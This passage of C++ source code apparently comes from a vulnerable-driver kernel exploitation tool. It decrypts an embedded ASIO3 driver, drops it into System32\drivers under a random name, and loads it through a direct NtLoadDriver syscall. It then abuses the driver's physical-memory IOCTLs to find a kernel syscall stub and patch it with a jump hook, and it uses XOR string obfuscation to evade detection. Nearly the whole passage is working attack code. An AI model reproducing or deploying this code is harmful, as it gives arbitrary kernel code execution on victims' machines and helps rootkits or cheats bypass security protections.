    if (!this->device_handle || !start || !size)
        return NULL;

    constexpr SIZE_T input_size = sizeof(asio3_info::structures::_IOCTL_MAP_PHYS_MEM_X32);
    asio3_info::structures::_IOCTL_MAP_PHYS_MEM_X32 input_buffer = { 0 };

    input_buffer.HalBusType = 0; input_buffer.HalInterfaceType = 0; input_buffer.hal_reserved = 0;

    input_buffer.physical_address.QuadPart = start;
    input_buffer.size = size;

    ULONG64 out_buffer = NULL;

    DWORD bytesReturned = NULL;
    BOOL result = sDeviceIoControl(this->device_handle, asio3_info::io_control_code::IOCTL_MAP_PHYS_MEMORY,
        &input_buffer, input_size, &out_buffer, sizeof(out_buffer), &bytesReturned, NULL);

    if (!result)
        return NULL;

    return out_buffer;
}

BOOL asio3_interface::unmap_phys_memory_x32(const ULONG64& mapped_address)
{
    if (!this->device_handle || !mapped_address)
        return false;

    ULONG64 input_buffer = mapped_address;
    ULONG64 output_buffer = NULL;

    DWORD bytesReturned = NULL;
    BOOL result = sDeviceIoControl(this->device_handle, asio3_info::io_control_code::IOCTL_UNMAP_PHYS_MEMORY,
        &input_buffer, sizeof(input_buffer), &output_buffer, sizeof(output_buffer), &bytesReturned, NULL);

    return result;
}

bool asio3_interface::verify_syscall()
{
    static PVOID _PsGetCurrentProcessId = this->get_kernel_export(XorString("ntoskrnl.exe"), XorString("PsGetCurrentProcessId"));

    std::vector<BYTE> original_bytes = { 0 };

    if (!this->hook_syscall(_PsGetCurrentProcessId, &original_bytes))
        return FALSE;

    HANDLE kernel_pid = do_syscall<HANDLE>(SysCallData.NtShutdownSystem);
  
    this->unhook_syscall(&original_bytes);

    return (kernel_pid == (HANDLE)GetCurrentProcessId());
}

void asio3_interface::physmeme_map_syscall(ULONG64 begin, ULONG64 end)
{
    auto check_page = [&](asio3_interface* asio3, ULONG64 page) -> bool
    {
        if (asio3->syscall_located.load())
            return true;
        __try
        {
            if (memcmp(reinterpret_cast<PVOID>(page), asio3->syscall_bytes.data(), asio3->syscall_bytes.size()) != 0)
                return false;
            //We have found our syscall, perhaps add extra checks to verify it works here
            asio3->syscall_mapping.store(reinterpret_cast<PVOID>(page));
            //Verify that the syscall works
            if (!asio3->verify_syscall())
                return false;

            asio3->syscall_located.store(true);
            return true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) 
        {
        }
        return false;
    };

    constexpr ULONG size_2MB = 0x1000 * 512;

    asio3_interface* asio3 = asio3_interface::get_instance();
    if (begin + end <= size_2MB)
    {
        asio3_info::structures::_IOCTL_MAP_UNMAP_PHYS_MEMORY_X64 ioctl_buffer = { 0 };
        auto page_va = reinterpret_cast<ULONG64>(asio3->map_phys_memory_x64(begin + asio3->syscall_page_offset, end, &ioctl_buffer));
        if (page_va)
        {
            for (auto page = page_va; page < page_va + end; page += 0x1000)
            {
                if (check_page(asio3, page))
                    return;
            }
            asio3->unmap_phys_memory_x64(&ioctl_buffer);
        }
    }
    else
    {
        //Larger than 2MB
        auto remainder = (begin + end) % (size_2MB);
        for (auto range = begin; range < begin + end; range += size_2MB)
        {
            asio3_info::structures::_IOCTL_MAP_UNMAP_PHYS_MEMORY_X64 ioctl_buffer = { 0 };
            auto page_va = reinterpret_cast<ULONG64>(asio3->map_phys_memory_x64(range + asio3->syscall_page_offset, size_2MB, &ioctl_buffer));
            if (page_va)
            {
                for (auto page = page_va; page < page_va + size_2MB; page += 0x1000)
                {
                    if (check_page(asio3, page))
                        return;
                }
                asio3->unmap_phys_memory_x64(&ioctl_buffer);
            }
        }
        //Itterate the left over data
        asio3_info::structures::_IOCTL_MAP_UNMAP_PHYS_MEMORY_X64 ioctl_buffer = { 0 };
        auto page_va = reinterpret_cast<ULONG64>(asio3->map_phys_memory_x64(begin + end - remainder + asio3->syscall_page_offset, remainder, &ioctl_buffer));
        if (page_va)
        {
            for (auto page = page_va; page < page_va + remainder; page += 0x1000)
            {
                if (check_page(asio3, page))
                    return;
            }
            asio3->unmap_phys_memory_x64(&ioctl_buffer);
        }

    }
}

bool asio3_interface::hook_syscall(PVOID function, std::vector<BYTE>* out_original_bytes)
{
    //if (!this->syscall_located.load())
    //    return false;

    static std::vector<BYTE> original_bytes = { 0 };
    std::vector<BYTE> asm_hook_jmp = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };

    memcpy(&asm_hook_jmp[2], &function, sizeof(PVOID));

    if (original_bytes.size() != asm_hook_jmp.size())
    {
        original_bytes.reserve(asm_hook_jmp.size());
        original_bytes.resize(asm_hook_jmp.size());

        memcpy(original_bytes.data(), (PVOID)this->syscall_mapping.load(), original_bytes.size());
    }

    *out_original_bytes = original_bytes;

    memcpy((PVOID)this->syscall_mapping.load(), asm_hook_jmp.data(), asm_hook_jmp.size());

    return true;

}
bool asio3_interface::unhook_syscall(std::vector<BYTE>* in_original_bytes)
{
    if (in_original_bytes->size() < 1)
        return false;

    memcpy((PVOID)this->syscall_mapping.load(), in_original_bytes->data(), in_original_bytes->size());

    in_original_bytes->clear();

    return true;
}

bool asio3_interface::load_driver(std::string* out_driver_name)
{
    const DWORD SeLoadDriverPrivilege = 10ull;

    if (!asio3_utils::acquire_privilege(SeLoadDriverPrivilege))
    {
        printf(XorString("Failed acquiring required privileges.\n"));
        return false;
    }

    std::string driver_name = "";

    if (out_driver_name->empty())
        driver_name = asio3_utils::gen_random_str(rand() % 10 + 4);
    else
        driver_name = *out_driver_name;

    std::string driver_file_name = driver_name + XorString(".sys");
    std::wstring u_driver_name(driver_name.begin(), driver_name.end());

    if (out_driver_name)
        *out_driver_name = driver_name;

    std::string full_driver_path = asio3_utils::get_sys_driver_path() + driver_file_name;

    const BYTE raw_data_key = 0xAF;
    for (auto& byte : asio3_raw::asio3_driver_encrypted)
        byte ^= raw_data_key;

    if (asio3_raw::asio3_driver_encrypted[0] != 0x4D || asio3_raw::asio3_driver_encrypted[1] != 0x5A)
    {
        printf(XorString("[nvoclk] Failed decrypting raw data\n"));
        return false;
    }

    if (!asio3_utils::create_file_from_mem(full_driver_path, (const char *)asio3_raw::asio3_driver_encrypted.data(), asio3_raw::asio3_driver_encrypted.size()))
    {
       printf(XorString("[nvoclk] Failed creating temp driver file\n"));
        return false;
    }

    if (!asio3_utils::registry_add_service(u_driver_name))
    {
        printf(XorString("[nvoclk] Failed creating driver service\n"));
        return false;
    }


    std::wstring source_registry = std::wstring(L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services\\") + u_driver_name;

    UNICODE_STRING unicode_buffer = { 0, 0, 0 };

    asio3_utils::InitUnicodeString(&unicode_buffer, source_registry.c_str());

    NTSTATUS status = do_syscall<NTSTATUS>(SysCallData.NtLoadDriver, &unicode_buffer);

    if (status != STATUS_SUCCESS)
        printf("NtLoadDriver failed : 0x%lX\n", GetLastError());

    return status == STATUS_SUCCESS ? true : false;
}

bool asio3_utils::acquire_privilege(DWORD privlage)
{
    typedef NTSTATUS(NTAPI* PFN_RTL_ADJUST_PRIVILEGE)(
        _In_ ULONG Privilege,
        _In_ BOOLEAN Enable,
        _In_ BOOLEAN CurrentThread,
        _Out_ PBOOLEAN Enabled
        );

    static PFN_RTL_ADJUST_PRIVILEGE pfnRtlAdjustPrivilege = (PFN_RTL_ADJUST_PRIVILEGE)GetProcAddress(
        GetModuleHandleA(XorString("ntdll.dll")), XorString("RtlAdjustPrivilege"));

    if(!pfnRtlAdjustPrivilege)
        return false;

    BOOLEAN Enabled = 0;
    return !pfnRtlAdjustPrivilege(privlage, 1ull, 0ull, &Enabled) || Enabled;
}

std::string asio3_utils::get_sys_driver_path()
{
    char SystemDirectory[MAX_PATH];
    GetSystemDirectoryA(SystemDirectory, MAX_PATH);

    std::string DriverPath = SystemDirectory;
    DriverPath += XorString("\\drivers\\");

    return DriverPath;
}

bool asio3_utils::create_file_from_mem(const std::string& desired_file_path, const char* address, size_t size)
{
    std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

    if (!file_ofstream.write(address, size))
    {
        file_ofstream.close();
        return false;
    }

    file_ofstream.close();
    return true;
}

std::string asio3_utils::gen_random_str(size_t len)
{
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";

    if (len > 63)
        return std::string(XorString("Error"));

    char cBuffer[64];

    for (int i = 0; i < len; ++i) {
        cBuffer[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    cBuffer[len] = 0;

    return std::string(cBuffer);
}

bool asio3_utils::registry_add_service(const std::wstring& driver_name)
{
    std::wstring registry_path = std::wstring((L"System\\CurrentControlSet\\Services\\")) + driver_name;

    //RemoveDriverFromRegistry(DriverName);

    HKEY Key;
    LSTATUS Status = RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        registry_path.c_str(),
        0,
        NULL,
        0,
        KEY_ALL_ACCESS,
        NULL,
        &Key,
        0);

    if (Status)
        return false;

    const auto RegWriteString = [=](const wchar_t* Name, const std::wstring& Data) -> NTSTATUS
    {
        return RegSetValueExW(Key,
            Name,
            0,
            REG_EXPAND_SZ,
            (PBYTE)Data.c_str(),
            (DWORD)Data.size() * sizeof(wchar_t));
    };
    const auto RegWriteDWORD = [=](const wchar_t* Name, DWORD Data) -> NTSTATUS
    {
        return RegSetValueExW(Key,
            Name,
            0,
            REG_DWORD,
            (PBYTE)&Data,
            sizeof(DWORD));
    };

    Status |= RegWriteString(L"ImagePath", std::wstring(L"\\SystemRoot\\System32\\drivers\\") + driver_name.c_str() + L".sys");
    Status |= RegWriteString(L"DisplayName", driver_name);
    Status |= RegWriteDWORD(L"Type", 1);
    Status |= RegWriteDWORD(L"ErrorControl", 1);
    Status |= RegWriteDWORD(L"Start", 4);//(disabled) Status |= RegWriteDWORD(L"Start", 3); DEMAND START

    if (Status)
    {
        RegCloseKey(Key);
        registry_remove_service(driver_name);
        return false;
    }


    RegCloseKey(Key);
    return true;
}

bool asio3_utils::registry_remove_service(const std::wstring& driver_name)
{
    LSTATUS Status = 0;

    std::wstring RegistryPath = std::wstring((L"System\\CurrentControlSet\\Services\\")) + driver_name;

    std::wstring RegistrySubKeyPath = std::wstring((L"System\\CurrentControlSet\\Services\\")) + driver_name + std::wstring(L"\\Enum");

    Status = RegDeleteKeyW(HKEY_LOCAL_MACHINE,
        RegistrySubKeyPath.c_str());
    //if (!Status || Status == ERROR_FILE_NOT_FOUND)
    //	return true;

    /*Status = SHDeleteKeyA(HKEY_LOCAL_MACHINE,
        RegistryPath.c_str());
    if (!Status || Status == ERROR_FILE_NOT_FOUND)
        return true;*/

    Status = RegDeleteKeyW(HKEY_LOCAL_MACHINE,
        RegistryPath.c_str());
    if (!Status || Status == ERROR_FILE_NOT_FOUND)
        return true;

    return false;
}

void asio3_utils::InitUnicodeString(PVOID pString, const wchar_t* pwszSource)
{
    PUNICODE_STRING str = reinterpret_cast<PUNICODE_STRING>(pString);
    if (!str)
        return;
    str->Length = (USHORT)(wcslen(pwszSource) * sizeof(wchar_t));
    str->MaximumLength = (USHORT)((wcslen(pwszSource) + 1) * sizeof(wchar_t));
    str->Buffer = (wchar_t*)pwszSource;
}
